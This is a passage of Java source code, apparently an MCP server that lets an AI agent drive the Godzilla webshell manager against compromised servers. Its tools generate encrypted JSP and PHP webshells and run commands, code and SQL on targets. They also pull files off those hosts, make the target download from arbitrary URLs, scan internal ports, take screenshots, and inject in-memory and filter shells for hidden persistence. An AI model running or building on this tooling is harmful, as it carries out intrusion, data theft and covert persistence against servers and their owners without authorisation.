                prop.addProperty("description", def[2]);
                props.add(def[0], prop);
                if (isRequired) required.add(def[0]);
            }
        }

        // 构建 JSON Schema（可变参数，每个元素是 [name, type, desc]）
        private JsonObject buildSchema(String[]... propDefs) {
            JsonObject schema = new JsonObject();
            schema.addProperty("type", "object");
            JsonObject props = new JsonObject();
            JsonArray required = new JsonArray();

            for (String[] def : propDefs) {
                String name = def[0];
                String type = def[1];
                String desc = def[2];

                JsonObject prop = new JsonObject();
                prop.addProperty("type", type);
                prop.addProperty("description", desc);
                props.add(name, prop);
                required.add(name);
            }

            schema.add("properties", props);
            schema.add("required", required);
            return schema;
        }

        private JsonObject buildToolDef(String name, String description, JsonObject inputSchema) {
            JsonObject tool = new JsonObject();
            tool.addProperty("name", name);
            tool.addProperty("description", description);
            tool.add("inputSchema", inputSchema);
            return tool;
        }

        // --- tools/call ---
        private JsonElement handleToolsCall(JsonObject params) throws Exception {
            String toolName = params.get("name").getAsString();
            JsonObject arguments = params.has("arguments") && params.get("arguments").isJsonObject()
                    ? params.getAsJsonObject("arguments") : new JsonObject();

            String resultText;
            switch (toolName) {
                case "list_shells":
                    resultText = getShellList();
                    break;
                case "add_shell":
                    resultText = addNewShell(arguments);
                    break;
                case "generate_shell":
                    resultText = generateShell(arguments);
                    break;
                case "get_env_config":
                    resultText = "{\"payloads\":[\"JavaDynamicPayload\",\"PhpDynamicPayload\",\"CShrapDynamicPayload\"]," +
                            "\"cryptions\":[\"JAVA_AES_BASE64\",\"PHP_XOR_BASE64\",\"CSHARP_AES_BASE64\"]}";
                    break;
                // 靶机操作
                case "get_basics_info":
                    resultText = executeOnTarget(arguments, "getBasicsInfo");
                    break;
                case "exec_command":
                    resultText = executeOnTarget(arguments, "execCommand",
                            requireParam(arguments, "command"));
                    break;
                case "list_files":
                    resultText = executeOnTarget(arguments, "listFile",
                            requireParam(arguments, "dirPath"));
                    break;
                case "read_file":
                    resultText = executeOnTarget(arguments, "readFile",
                            requireParam(arguments, "filePath"));
                    break;
                case "upload_file":
                    resultText = executeOnTarget(arguments, "uploadFile",
                            requireParam(arguments, "filePath"),
                            requireParam(arguments, "base64Data"));
                    break;
                case "exec_sql":
                    resultText = executeSqlOnTarget(arguments);
                    break;
                case "connect_shell": resultText = connectShell(arguments); break;
                case "disconnect_shell": resultText = disconnectShell(arguments); break;
                case "list_sessions": resultText = listSessions(); break;
                case "test_connection": resultText = testConnection(arguments); break;
                case "remove_shell": resultText = removeShell(arguments); break;
                case "plugin_list": resultText = pluginList(); break;
                case "plugin_add": resultText = pluginAdd(arguments); break;
                case "plugin_remove": resultText = pluginRemove(arguments); break;
                case "current_user": resultText = currentUserTool(arguments); break;
                case "process_list": resultText = processListTool(arguments); break;
                case "network_info": resultText = networkInfoTool(arguments); break;
                case "screenshot": resultText = screenshotTool(arguments); break;
                case "exec_code": resultText = execCodeTool(arguments); break;
                case "write_file": resultText = writeFileTool(arguments); break;
                case "download_file": resultText = downloadFileTool(arguments); break;
                case "delete_file": resultText = deleteFileTool(arguments); break;
                case "copy_file": resultText = copyFileTool(arguments); break;
                case "move_file": resultText = moveFileTool(arguments); break;
                case "new_file": resultText = newFileTool(arguments); break;
                case "new_dir": resultText = newDirTool(arguments); break;
                case "list_root": resultText = listRootTool(arguments); break;
                case "file_size": resultText = fileSizeTool(arguments); break;
                case "file_remote_down": resultText = fileRemoteDownTool(arguments); break;
                case "big_file_upload": resultText = bigFileUploadTool(arguments); break;
                case "list_databases": resultText = listDatabasesTool(arguments); break;
                case "enum_database_conn": resultText = enumDatabaseConnTool(arguments); break;
                case "port_scan": resultText = portScanTool(arguments); break;
                case "memory_shell_inject": resultText = memoryShellInjectTool(arguments); break;
                case "memory_shell_list": resultText = memoryShellListTool(arguments); break;
                case "memory_shell_unload": resultText = memoryShellUnloadTool(arguments); break;
                case "filter_shell_add": resultText = filterShellAddTool(arguments); break;
                case "filter_shell_list": resultText = filterShellListTool(arguments); break;
                case "filter_shell_remove": resultText = filterShellRemoveTool(arguments); break;
                case "zip": resultText = zipTool(arguments); break;
                default:
                    throw new Exception("Unknown tool: " + toolName);
            }

            // MCP tools/call 返回 content 数组
            JsonObject callResult = new JsonObject();
            JsonArray content = new JsonArray();
            JsonObject textContent = new JsonObject();
            textContent.addProperty("type", "text");
            textContent.addProperty("text", resultText);
            content.add(textContent);
            callResult.add("content", content);
            return callResult;
        }

        // --- resources/list ---
        private JsonObject handleResourcesList() {
            JsonObject result = new JsonObject();
            JsonArray resources = new JsonArray();

            Vector<Vector<String>> shells = Db.getAllShell();
            for (Vector<String> row : shells) {
                if (row.size() >= 2) {
                    JsonObject resource = new JsonObject();
                    resource.addProperty("uri", "shell://" + row.get(0));
                    resource.addProperty("name", row.get(1));
                    resource.addProperty("mimeType", "application/json");
                    if (row.size() >= 5) {
                        resource.addProperty("description", "Payload: " + row.get(4));
                    }
                    resources.add(resource);
                }
            }

            result.add("resources", resources);
            return result;
        }

        // ========== 靶机操作辅助方法 ==========

        private String executeOnTarget(JsonObject args, String action, String... extraParams) throws Exception {
            String targetUrl = requireParam(args, "targetUrl");
            log("[MCP] executeOnTarget: action=" + action + ", targetUrl=" + targetUrl);

            try {
                Payload payload = getOrInitPayload(targetUrl);
                return doExecute(payload, action, extraParams);
            } catch (Exception firstAttempt) {
                log("[MCP] 首次执行失败，清缓存重试: " + stringifyError(firstAttempt));
                payloadCache.remove(targetUrl);
                Payload payload = getOrInitPayload(targetUrl);
                return doExecute(payload, action, extraParams);
            }
        }

        private String doExecute(Payload payload, String action, String... extraParams) throws Exception {
            String result;
            switch (action) {
                case "getBasicsInfo":
                    result = payload.getBasicsInfo();
                    break;
                case "execCommand":
                    result = toSafeBase64(payload.execCommand(extraParams[0]));
                    break;
                case "listFile":
                    result = toSafeBase64(payload.getFile(extraParams[0]));
                    break;
                case "readFile": {
                    byte[] fileBytes = payload.downloadFile(extraParams[0]);
                    result = fileBytes != null ? Base64.getEncoder().encodeToString(fileBytes) : null;
                    break;
                }
                case "uploadFile": {
                    byte[] uploadData = Base64.getDecoder().decode(extraParams[1]);
                    result = payload.uploadFile(extraParams[0], uploadData) ? "Upload success" : "Upload failed";
                    break;
                }
                default:
                    throw new Exception("Unknown action: " + action);
            }

            log("[MCP] 操作结果(" + action + "): " +
                    (result == null ? "null" :
                            (result.length() > 300 ? result.substring(0, 300) + "..." : result)));
            return result;
        }

        private String executeSqlOnTarget(JsonObject args) throws Exception {
            String targetUrl = requireParam(args, "targetUrl");
            Payload payload = getOrInitPayload(targetUrl);

            return payload.execSql(
                    requireParam(args, "dbType"),
                    requireParam(args, "dbHost"),
                    args.get("dbPort").getAsInt(),
                    requireParam(args, "dbUser"),
                    requireParam(args, "dbPass"),
                    args.has("dbName") ? requireParam(args, "dbName") : "",
                    new java.util.HashMap<>(),
                    requireParam(args, "execSql")
            );
        }

        // ========== 兼容旧版自定义 API ==========

        private void handleLegacyRequest(HttpExchange exchange, JsonObject jsonReq) throws IOException {
            try {
                String action = jsonReq.get("action").getAsString();
                JsonObject params = jsonReq.has("params") ? jsonReq.getAsJsonObject("params") : new JsonObject();

                String resultData;

                switch (action) {
                    case "getEnvConfig":
                        resultData = "{\"payloads\":[\"JavaDynamicPayload\",\"PhpDynamicPayload\",\"CShrapDynamicPayload\"], " +
                                "\"cryptions\":[\"JAVA_AES_BASE64\",\"PHP_XOR_BASE64\",\"CSHARP_AES_BASE64\"]}";
                        break;
                    case "listShells":
                        resultData = getShellList();
                        break;
                    case "addShell":
                        resultData = addNewShell(params);
                        break;
                    case "readFile":
                        if (!params.has("targetUrl")) throw new Exception("缺少参数 'targetUrl'");
                        String rfUrl = params.get("targetUrl").getAsString();
                        Payload rfPayload = getOrInitPayload(rfUrl);
                        byte[] fileBytes = rfPayload.downloadFile(requireParam(params, "filePath"));
                        resultData = fileBytes != null
                                ? Base64.getEncoder().encodeToString(fileBytes)
                                : null;
                        break;
                    default:
                        String targetUrl = requireParam(params, "targetUrl");
                        Payload payload = getOrInitPayload(targetUrl);
                        resultData = executePayloadAction(payload, action, params);
                        break;
                }

                JsonObject responseJson = new JsonObject();
                responseJson.addProperty("status", "success");
                responseJson.addProperty("data", resultData);
                sendHttpResponse(exchange, 200, responseJson.toString());
            } catch (Exception e) {
                JsonObject err = new JsonObject();
                err.addProperty("status", "error");
                err.addProperty("msg", stringifyError(e));
                sendHttpResponse(exchange, 500, err.toString());
            }
        }

        // ========== 共享业务方法 ==========

        private String getShellList() {
            Vector<Vector<String>> shells = Db.getAllShell();
            JsonArray shellArray = new JsonArray();

            for (Vector<String> row : shells) {
                JsonObject obj = new JsonObject();
                if (row.size() >= 2) {
                    obj.addProperty("id", row.get(0));
                    obj.addProperty("url", row.get(1));
                    if (row.size() >= 5) {
                        obj.addProperty("payload", row.get(4));
                    }
                }
                JsonArray rawDataArray = new JsonArray();
                for (String item : row) {
                    rawDataArray.add(item);
                }
                obj.add("rawData", rawDataArray);
                shellArray.add(obj);
            }
            return shellArray.toString();
        }

        private String addNewShell(JsonObject params) throws Exception {
            ShellEntity newShell = new ShellEntity();
            newShell.setUrl(params.get("url").getAsString());
            newShell.setPassword(params.get("password").getAsString());
            newShell.setSecretKey(params.get("secretKey").getAsString());
            newShell.setPayload(params.get("payload").getAsString());
            newShell.setCryption(params.get("cryption").getAsString());
            newShell.setEncoding("UTF-8");

            if (Db.addShell(newShell) > 0) {
                if (!Boolean.getBoolean("godzilla.mcp.headless")) {
                SwingUtilities.invokeLater(() -> MainActivity.getFrame().refreshShellView());
            }
                return "Successfully added shell: " + newShell.getUrl();
            } else {
                throw new Exception("Add shell failed. URL might already exist.");
            }
        }

        // ===== [headless patch] generate_shell 实现 =====
        private String generateShell(JsonObject params) throws Exception {
            String cryption = requireParam(params, "cryption");
            String password = requireParam(params, "password");
            String secretKey = requireParam(params, "secretKey");
            String outputPath = requireParam(params, "outputPath");
            byte[] data;
            if ("JAVA_AES_BASE64".equals(cryption) || "JAVA_AES_RAW".equals(cryption)) {
                // [headless patch] 与 JavaAesBase64.generate 一致：AES 密钥 = md5(secretKey)[0:16]
                String derivedKey = util.functions.md5(secretKey);
                derivedKey = derivedKey.substring(0, Math.min(16, derivedKey.length()));
                data = buildJavaShell("JAVA_AES_RAW".equals(cryption), password, derivedKey);
            } else if ("PHP_XOR_BASE64".equals(cryption) || "PHP_XOR_RAW".equals(cryption)) {
                // [headless patch] 与 PhpXor.generate 一致：XOR 密钥 = md5(secretKey)[0:16]
                String derivedKey = util.functions.md5(secretKey);
                derivedKey = derivedKey.substring(0, Math.min(16, derivedKey.length()));
                data = buildPhpShell("PHP_XOR_RAW".equals(cryption), password, derivedKey);
            } else {
                throw new Exception("Unsupported cryption: " + cryption
                        + " (supported: JAVA_AES_BASE64, JAVA_AES_RAW, PHP_XOR_BASE64, PHP_XOR_RAW)");
            }
            java.io.File out = new java.io.File(outputPath);
            if (out.getParentFile() != null && !out.getParentFile().exists()) {
                out.getParentFile().mkdirs();
            }
            java.io.FileOutputStream fos = new java.io.FileOutputStream(out);
            fos.write(data);
            fos.close();
            log("[MCP] generated shell: " + cryption + " -> " + out.getAbsolutePath() + " (" + data.length + " bytes)");
            return "✓ Generated shell (" + cryption + ")\nPath: " + out.getAbsolutePath() + "\nSize: " + data.length + " bytes";
        }

        private byte[] buildJavaShell(boolean isBin, String pass, String secretKey) throws Exception {
            String variant = isBin ? "raw" : "base64";
            String globalCode = readRes("/shells/cryptions/JavaAes/template/" + variant + "GlobalCode.bin");
            String code = readRes("/shells/cryptions/JavaAes/template/" + variant + "Code.bin");
            globalCode = globalCode.replace("{pass}", pass).replace("{secretKey}", secretKey);
            code = code.replace("{pass}", pass).replace("{secretKey}", secretKey);
            String template = readRes("/shells/cryptions/JavaAes/template/shell.jsp");
            template = template.replace("{globalCode}", globalCode).replace("{code}", code);
            return template.getBytes(StandardCharsets.UTF_8);
        }

        private byte[] buildPhpShell(boolean isBin, String pass, String secretKey) throws Exception {
            String code = readRes("/shells/cryptions/phpXor/template/" + (isBin ? "raw.bin" : "base64.bin"));
            code = code.replace("{pass}", pass).replace("{secretKey}", secretKey);
            code = util.TemplateEx.run(code);
            return code.getBytes(StandardCharsets.UTF_8);
        }

        private String readRes(String path) throws Exception {
            InputStream is = getClass().getResourceAsStream(path);
            if (is == null) {
                throw new Exception("Classpath resource not found: " + path);
            }
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            byte[] buf = new byte[8192];
            int n;
            while ((n = is.read(buf)) != -1) {
                bos.write(buf, 0, n);
            }
            is.close();
            return new String(bos.toByteArray(), StandardCharsets.UTF_8);
        }

    /* ===================== v1.2.0 扩展工具实现 ===================== */
    private interface TargetOp<T> {
        T run(Payload p) throws Exception;
    }

    private <T> T onTarget(JsonObject args, TargetOp<T> op) throws Exception {
        String url = requireParam(args, "targetUrl");
        try {
            return op.run(getOrInitPayload(url));
        } catch (Exception first) {
            log("[MCP] 首次执行失败，清缓存重试: " + McpHandler.stringifyError(first));
            payloadCache.remove(url);
            return op.run(getOrInitPayload(url));
        }
    }

    private static String optString(JsonObject o, String k, String d) {
        if (o == null || !o.has(k) || o.get(k).isJsonNull()) return d;
        try { return o.get(k).getAsString(); } catch (Exception e) { return d; }
    }

    private static boolean optBool(JsonObject o, String k, boolean d) {
        if (o == null || !o.has(k) || o.get(k).isJsonNull()) return d;
        try { return o.get(k).getAsBoolean(); } catch (Exception e) { return d; }
    }

    private static int optInt(JsonObject o, String k, int d) {
        if (o == null || !o.has(k) || o.get(k).isJsonNull()) return d;
        try { return o.get(k).getAsInt(); } catch (Exception e) { return d; }
    }

    private byte[] readResBytes(String path) throws Exception {
        InputStream is = getClass().getResourceAsStream(path);
        if (is == null) throw new Exception("Classpath resource not found: " + path);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[8192];
        int n;
        while ((n = is.read(buf)) != -1) bos.write(buf, 0, n);
        is.close();
        return bos.toByteArray();
    }

    private static String normalizePorts(String raw) {
        StringBuilder sb = new StringBuilder();
        for (String part : raw.split(",")) {
            part = part.trim();
            if (part.isEmpty()) continue;
            if (part.contains("-")) {
                String[] ab = part.split("-", 2);
                try {
                    int a = Integer.parseInt(ab[0].trim());
                    int b = Integer.parseInt(ab[1].trim());
                    for (int p = a; p <= b; p++) { if (sb.length() > 0) sb.append(","); sb.append(p); }
                } catch (Exception e) { if (sb.length() > 0) sb.append(","); sb.append(part); }
            } else {
                if (sb.length() > 0) sb.append(",");
                sb.append(part);
            }
        }
        return sb.toString();
    }

    // ---------- 会话管理 ----------
    private String connectShell(JsonObject a) throws Exception {
        String url = requireParam(a, "url");
        String password = requireParam(a, "password");
        String secretKey = requireParam(a, "secretKey");
        String payloadType = optString(a, "payload", "JavaDynamicPayload");
        String cryption = optString(a, "cryption", "JAVA_AES_BASE64");
        boolean save = optBool(a, "save", false);
        ShellEntity e = new ShellEntity();
        e.setUrl(url);
        e.setPassword(password);
        e.setSecretKey(secretKey);
        e.setPayload(payloadType);
        e.setCryption(cryption);
        e.setEncoding("UTF-8");
        if (!e.initShellOpertion()) throw new Exception("连接失败：请检查 URL / 密码 / 密钥 / Payload / 加密方式");
        payloadCache.put(url, e.getPayloadModule());
        StringBuilder sb = new StringBuilder();
        sb.append("✓ 连接成功\nURL: ").append(url).append("\nPayload: ").append(payloadType).append("\nCryption: ").append(cryption);
        if (save) {
            try { sb.append("\n库写入: ").append(Db.addShell(e) > 0 ? "成功" : "失败(可能已存在)"); }
            catch (Throwable t) { sb.append("\n库写入异常: ").append(McpHandler.stringifyError(t)); }
        }
        return sb.toString();
    }

    private String disconnectShell(JsonObject a) {
        String url = optString(a, "targetUrl", null);
        if (url == null || url.isEmpty()) {
            int n = payloadCache.size();
            payloadCache.clear();
            return "✓ 已断开全部会话（" + n + " 个）";
        }
        return payloadCache.remove(url) != null ? "✓ 已断开: " + url : "未找到会话: " + url;
    }

    private String listSessions() {
        JsonArray arr = new JsonArray();
        for (java.util.Map.Entry<String, Payload> en : payloadCache.entrySet()) {
            JsonObject o = new JsonObject();
            o.addProperty("url", en.getKey());
            try { o.addProperty("payloadClass", en.getValue().getClass().getName()); } catch (Throwable t) { }
            arr.add(o);
        }
        return arr.toString();
    }

    private String testConnection(JsonObject a) throws Exception {
        String url = requireParam(a, "targetUrl");
        try {
            Payload p = getOrInitPayload(url);
            boolean ok = p.test();
            return ok ? "✓ 连接存活\nCurrentUser: " + p.currentUserName() : "✗ 连接测试失败";
        } catch (Exception e) {
            return "✗ 连接失败: " + McpHandler.stringifyError(e);
        }
    }

    private String removeShell(JsonObject a) throws Exception {
        String selector = requireParam(a, "selector");
        String id = resolveShellId(selector);
        if (id == null) throw new Exception("未找到记录: " + selector + "（可用 list_shells 查看）");
        String url = null;
        ShellEntity old = Db.getOneShell(id);
        if (old != null) url = old.getUrl();
        int r = Db.removeShell(id);
        if (url != null) payloadCache.remove(url);
        return r > 0 ? "✓ 已删除记录: " + id + (url != null ? " (" + url + ")" : "") : "删除失败: " + id;
    }

    private String resolveShellId(String selector) {
        if (selector == null || selector.isEmpty()) return null;
        Vector<Vector<String>> rows = Db.getAllShell();
        for (int i = 1; i < rows.size(); i++) {
            Vector<String> row = rows.get(i);
            if (row.size() >= 2 && row.get(1) != null && row.get(1).toString().equals(selector)) return String.valueOf(row.get(0));
        }
        for (int i = 1; i < rows.size(); i++) {
            Vector<String> row = rows.get(i);
            if (row.size() >= 1 && selector.equals(String.valueOf(row.get(0)))) return selector;
        }
        if (selector.matches("\\d+")) {
            int idx = Integer.parseInt(selector);
            if (idx >= 1 && idx < rows.size()) return String.valueOf(rows.get(idx).get(0));
        }
        return null;
    }

    // ---------- 哥斯拉库/插件管理（无 GUI 场景） ----------
    private String pluginList() {
        String[] plugins = Db.getAllPlugin();
        JsonArray arr = new JsonArray();
        for (String s : plugins) arr.add(s);
        return arr.toString();
    }

    private String pluginAdd(JsonObject a) throws Exception {
        String path = requireParam(a, "path");
        java.io.File f = new java.io.File(path);
        if (!f.isAbsolute()) f = f.getAbsoluteFile();
        if (!f.isFile()) throw new Exception("文件不存在: " + f.getAbsolutePath());
        int r = Db.addPlugin(f.getAbsolutePath());
        return r > 0 ? "✓ 已注册插件（重启哥斯拉后生效）: " + f.getAbsolutePath()
                     : "已存在，未重复注册: " + f.getAbsolutePath();
    }

    private String pluginRemove(JsonObject a) throws Exception {
        String path = requireParam(a, "path");
        int r = Db.removePlugin(path);
        return r > 0 ? "✓ 已移除: " + path : "未找到: " + path;
    }

    // ---------- 系统信息 ----------
    private String currentUserTool(JsonObject a) throws Exception {
        return onTarget(a, p -> "CurrentUser: " + p.currentUserName() + "\nCurrentDir: " + p.currentDir());
    }

    private String processListTool(JsonObject a) throws Exception {
        return onTarget(a, p -> toSafeBase64(p.execCommand(p.isWindows() ? "tasklist" : "/bin/sh -c \"ps aux 2>/dev/null || ps -ef\"")));
    }

    private String networkInfoTool(JsonObject a) throws Exception {
        return onTarget(a, p -> toSafeBase64(p.execCommand(p.isWindows()
                ? "cmd /c \"ipconfig /all & netstat -ano\""
                : "/bin/sh -c \"hostname -i 2>&1; ip addr 2>&1; ifconfig 2>&1; netstat -rn 2>&1; ss -tun 2>&1\"")));
    }

    private String screenshotTool(JsonObject a) throws Exception {
        final String savePath = optString(a, "savePath", null);
        return onTarget(a, p -> {
            byte[] data = p.evalFunc(null, "screen", new util.http.ReqParameter());
            if (data == null || data.length == 0) throw new Exception("截图失败：无返回数据");
            if (data.length < 100) return "截图失败: " + new String(data, StandardCharsets.UTF_8);
            if (savePath != null && !savePath.isEmpty()) {
                java.io.File out = new java.io.File(savePath);
                if (out.getParentFile() != null && !out.getParentFile().exists()) out.getParentFile().mkdirs();
                java.io.FileOutputStream fos = new java.io.FileOutputStream(out);
                fos.write(data);
                fos.close();
                return "✓ 截图已保存: " + out.getAbsolutePath() + " (" + data.length + " bytes)";
            }
            return "data:image/jpeg;base64," + Base64.getEncoder().encodeToString(data);
        });
    }

    // ---------- 代码执行（PHP） ----------
    private String execCodeTool(JsonObject a) throws Exception {
        final String code = requireParam(a, "code");
        return onTarget(a, p -> {
            if (!p.getClass().getName().contains("Php")) {
                throw new Exception("exec_code 仅支持 PHP 载荷（当前: " + p.getClass().getName() + "）");
            }
            if (!p.include("PHP_Eval_Code", readResBytes("/shells/plugins/php/assets/evalCode.php"))) {
                throw new Exception("PHP_Eval_Code 插件加载失败");
            }
            util.http.ReqParameter rp = new util.http.ReqParameter();
            rp.add("plugin_eval_code", code);
            return new String(p.evalFunc("PHP_Eval_Code", "xxx", rp), StandardCharsets.UTF_8);
        });
    }

    // ---------- 文件操作 ----------
    private String writeFileTool(JsonObject a) throws Exception {
        final String path = requireParam(a, "path");
        final String content = requireParam(a, "content");
        return onTarget(a, p -> p.uploadFile(path, content.getBytes(StandardCharsets.UTF_8))
                ? "✓ 写入成功: " + path : "✗ 写入失败: " + path);
    }

    private String downloadFileTool(JsonObject a) throws Exception {
        final String remote = requireParam(a, "remotePath");
        final String local = requireParam(a, "localPath");
        return onTarget(a, p -> {
            java.io.File out = new java.io.File(local);
            if (out.getParentFile() != null && !out.getParentFile().exists()) out.getParentFile().mkdirs();
            java.io.FileOutputStream fos = new java.io.FileOutputStream(out);
            long total = 0;
            try {
                int size = p.getFileSize(remote);
                if (size > 0) {
                    int chunk = 512 * 1024;
                    int pos = 0;
                    while (pos < size) {
                        byte[] buf = p.bigFileDownload(remote, pos, chunk);
                        if (buf == null || buf.length == 0) break;
                        fos.write(buf);
                        total += buf.length;
                        pos += buf.length;
                    }
                } else {
                    byte[] buf = p.downloadFile(remote);
                    if (buf == null) throw new Exception("下载失败（文件不存在？）: " + remote);
                    fos.write(buf);
                    total = buf.length;
                }
            } finally {
                fos.close();
            }
            return "✓ 已下载: " + remote + " -> " + out.getAbsolutePath() + " (" + total + " bytes)";
        });
    }

    private String deleteFileTool(JsonObject a) throws Exception {
        final String path = requireParam(a, "path");
        return onTarget(a, p -> p.deleteFile(path) ? "✓ 已删除: " + path : "✗ 删除失败: " + path);
    }

    private String copyFileTool(JsonObject a) throws Exception {
        final String src = requireParam(a, "src");
        final String dest = requireParam(a, "dest");
        return onTarget(a, p -> p.copyFile(src, dest) ? "✓ 已复制: " + src + " -> " + dest : "✗ 复制失败");
    }

    private String moveFileTool(JsonObject a) throws Exception {
        final String src = requireParam(a, "src");
        final String dest = requireParam(a, "dest");
        return onTarget(a, p -> p.moveFile(src, dest) ? "✓ 已移动: " + src + " -> " + dest : "✗ 移动失败");
    }

    private String newFileTool(JsonObject a) throws Exception {
        final String path = requireParam(a, "path");
        return onTarget(a, p -> p.newFile(path) ? "✓ 已创建文件: " + path : "✗ 创建失败: " + path);
    }

    private String newDirTool(JsonObject a) throws Exception {
        final String path = requireParam(a, "path");
        return onTarget(a, p -> p.newDir(path) ? "✓ 已创建目录: " + path : "✗ 创建失败: " + path);
    }

    private String listRootTool(JsonObject a) throws Exception {
        return onTarget(a, p -> {
            StringBuilder sb = new StringBuilder();
            for (String s : p.listFileRoot()) { if (sb.length() > 0) sb.append("\n"); sb.append(s); }
            return sb.toString();
        });
    }

    private String fileSizeTool(JsonObject a) throws Exception {
        final String path = requireParam(a, "path");
        return onTarget(a, p -> "size: " + p.getFileSize(path) + " bytes (" + path + ")");
    }

    private String fileRemoteDownTool(JsonObject a) throws Exception {
        final String url = requireParam(a, "url");
        final String savePath = requireParam(a, "savePath");
        return onTarget(a, p -> p.fileRemoteDown(url, savePath)
                ? "✓ 目标已下载: " + savePath + " <- " + url : "✗ 下载失败: " + url);
    }

    private String bigFileUploadTool(JsonObject a) throws Exception {
        final String local = requireParam(a, "localPath");
        final String remote = requireParam(a, "remotePath");
        return onTarget(a, p -> {
            byte[] all = java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(local));
            int chunk = 512 * 1024;
            int pos = 0;
            while (pos < all.length) {
                int len = Math.min(chunk, all.length - pos);
                byte[] part = java.util.Arrays.copyOfRange(all, pos, pos + len);
                String r = p.bigFileUpload(remote, pos, part);
                if (r != null && !r.trim().isEmpty() && !"ok".equalsIgnoreCase(r.trim())) {
                    throw new Exception("分块上传失败 @" + pos + ": " + r);
                }
                pos += len;
            }
            p.bigFileUpload(remote, -1, new byte[0]);
            return "✓ 上传完成: " + local + " -> " + remote + " (" + all.length + " bytes)";
        });
    }

    // ---------- 数据库 ----------
    private String listDatabasesTool(JsonObject a) throws Exception {
        final String dbType = optString(a, "dbType", "mysql");
        final String host = requireParam(a, "host");
        final int port = optInt(a, "port", 3306);
        final String username = optString(a, "username", "root");
        final String password = optString(a, "password", "");
        String q;
        if ("mysql".equalsIgnoreCase(dbType)) q = "SHOW DATABASES";
        else if ("mssql".equalsIgnoreCase(dbType) || "sqlserver".equalsIgnoreCase(dbType)) q = "SELECT name FROM sys.databases";
        else if ("oracle".equalsIgnoreCase(dbType)) q = "SELECT username FROM all_users";
        else if ("postgresql".equalsIgnoreCase(dbType)) q = "SELECT datname FROM pg_database";
        else q = "SELECT 1";
        final String query = q;
        return onTarget(a, p -> p.execSql(dbType, host, port, username, password, "select", null, query));
    }

    private String enumDatabaseConnTool(JsonObject a) throws Exception {
        return onTarget(a, p -> {
            if (!p.include("plugin.ShellDriver", readResBytes("/shells/plugins/java/assets/ShellDriver.classs"))) {
                throw new Exception("ShellDriver 插件加载失败");
            }
            return new String(p.evalFunc("plugin.ShellDriver", "run", new util.http.ReqParameter()), StandardCharsets.UTF_8);
        });
    }

    // ---------- 高级功能 ----------
    private String portScanTool(JsonObject a) throws Exception {
        final String host = requireParam(a, "target");
        final String ports = normalizePorts(requireParam(a, "ports"));
        return onTarget(a, p -> {
            final String className = "plugin.JPortScan";
            if (!p.include(className, readResBytes("/shells/plugins/java/assets/JPortScan.classs"))) {
                throw new Exception("端口扫描插件加载失败");
            }
            util.http.ReqParameter rp = new util.http.ReqParameter();
            rp.add("ip", host);
            rp.add("ports", ports);
            String result = new String(p.evalFunc(className, "run", rp), StandardCharsets.UTF_8);
            JsonArray arr = new JsonArray();
            for (String line : result.split("\n")) {
                String[] cols = line.split("\t");
                if (cols.length >= 3) {
                    JsonObject o = new JsonObject();
                    o.addProperty("ip", cols[0].trim());
                    try { o.addProperty("port", Integer.parseInt(cols[1].trim())); } catch (Exception e) { o.addProperty("port", cols[1].trim()); }
                    o.addProperty("open", "1".equals(cols[2].trim()));
                    arr.add(o);
                }
            }
            if (arr.size() == 0) return "原始结果:\n" + result;
            return arr.toString();
        });
    }

    private String memoryShellInjectTool(JsonObject a) throws Exception {
        final String pattern = requireParam(a, "urlPattern");
        final String password = requireParam(a, "password");
        final String secretKeyRaw = requireParam(a, "secretKey");
        final String shellType = optString(a, "shellType", "AES_BASE64");
        if (!(shellType.equals("AES_BASE64") || shellType.equals("AES_RAW") || shellType.equals("Behinder")
                || shellType.equals("Cknife") || shellType.equals("ReGeorg"))) {
            throw new Exception("不支持的 shellType: " + shellType + "（可选 AES_BASE64/AES_RAW/Behinder/Cknife/ReGeorg）");
        }
        return onTarget(a, p -> {
            String secretKey = util.functions.md5(secretKeyRaw).substring(0, 16);
            String className = "x." + shellType;
            if (!p.include(className, readResBytes("/shells/plugins/java/assets/" + shellType + ".classs"))) {
                throw new Exception("include 失败: " + className);
            }
            util.http.ReqParameter rp = new util.http.ReqParameter();
            rp.add("pwd", password);
            rp.add("secretKey", secretKey);
            rp.add("path", pattern);
            String result = new String(p.evalFunc(className, "run", rp), StandardCharsets.UTF_8);
            return result + "\n提示: 内存马路径 " + pattern + "，可用同密码/密钥 + JAVA_AES_BASE64 连接";
        });
    }

    private String memoryShellListTool(JsonObject a) throws Exception {
        return onTarget(a, p -> {
            if (!p.include("plugin.ServletManage", readResBytes("/shells/plugins/java/assets/ServletManage.classs"))) {
                throw new Exception("ServletManage 插件加载失败");
            }
            return new String(p.evalFunc("plugin.ServletManage", "getAllServlet", new util.http.ReqParameter()), StandardCharsets.UTF_8);
        });
    }

    private String memoryShellUnloadTool(JsonObject a) throws Exception {
        final String wrapperName = requireParam(a, "wrapperName");
        final String urlPattern = optString(a, "urlPattern", wrapperName);
        return onTarget(a, p -> {
            if (!p.include("plugin.ServletManage", readResBytes("/shells/plugins/java/assets/ServletManage.classs"))) {
                throw new Exception("ServletManage 插件加载失败");
            }
            util.http.ReqParameter rp = new util.http.ReqParameter();
            rp.add("wrapperName", wrapperName);
            rp.add("urlPattern", urlPattern);
            return new String(p.evalFunc("plugin.ServletManage", "unLoadServlet", rp), StandardCharsets.UTF_8);
        });
    }

    private String filterShellAddTool(JsonObject a) throws Exception {
        final String password = requireParam(a, "password");
        final String secretKeyRaw = requireParam(a, "secretKey");
        final String cookie = optString(a, "cookie", util.functions.md5(Long.toString(System.currentTimeMillis())).substring(0, 16));
        final String shellType = optString(a, "shellType", "AES_BASE64");
        if (!(shellType.equals("AES_BASE64") || shellType.equals("AES_RAW"))) {
            throw new Exception("filter shellType 仅支持 AES_BASE64 / AES_RAW");
        }
        return onTarget(a, p -> {
            String secretKey = util.functions.md5(secretKeyRaw).substring(0, 16);
            String className = "f." + shellType;
            if (!p.include(className, readResBytes("/shells/plugins/java/assets/F_" + shellType + ".classs"))) {
                throw new Exception("include 失败: " + className);
            }
            util.http.ReqParameter rp = new util.http.ReqParameter();
            rp.add("secretKey", secretKey);
            rp.add("ck", cookie);
            rp.add("pwd", password);
            return new String(p.evalFunc(className, "run", rp), StandardCharsets.UTF_8);
        });
    }

    private String filterShellListTool(JsonObject a) throws Exception {
        return onTarget(a, p -> {
            if (!p.include("plugin.FilterManage", readResBytes("/shells/plugins/java/assets/FilterManage.classs"))) {
                throw new Exception("FilterManage 插件加载失败");
            }
